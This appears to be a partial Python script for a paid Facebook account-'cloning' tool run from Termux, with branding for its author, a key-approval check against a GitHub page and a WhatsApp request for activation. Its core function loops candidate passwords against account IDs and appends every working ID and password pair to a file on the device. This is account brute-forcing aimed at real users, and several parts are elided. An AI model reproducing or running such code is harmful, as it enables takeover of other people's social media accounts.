#-------------------------[WELCOME]---------------------#
#TOOLS OWNER TALHA MUMAI
#TALHA IS BRAND 
#CODING BY hackerboy talha
#---------------------------| Import |---------------------------#
...
print('<|©|> LOADING HAFEZ TALHA PAID TOOLS ')
try:
...
os.system('clear')
os.system('espeak -a 300 "assalamu, olaikum, everyone, well,come to,sifat, tools"')
os.system('xdg-open https://www.facebook.com/tariqul.islam.talha.Bro')
#---------------------------| Logo |---------------------------#
logo=(f"""\x1b[1;97m
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|TALHA-XD|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|TALHA-OK|> {uid} ● {ps}")
				open("/sdcard/TALHA-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
...
def meyexudi():
  ...
  id = ''.join(uuid)
  try:
    httpCaht = requests.get(f"https://github.com/tanvirul841-eng").text
    if id in httpCaht:
      msg = str(os.geteuid())
      print()
      pass
      ...
      print(' \x1b[38;5;208m╔══[𝟷]💥  ID LOGIN 95%')      
      print(' \x1b[1;98m║══[•]💥  ONLY 2010-2014 ID CLONE ')
      ...
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   hacker,   TALHA ,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[KEY]  : "+id)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801612088752?text='+tks),approval()       
  except:
    sys.exit()
print(logo)
meyexudi()
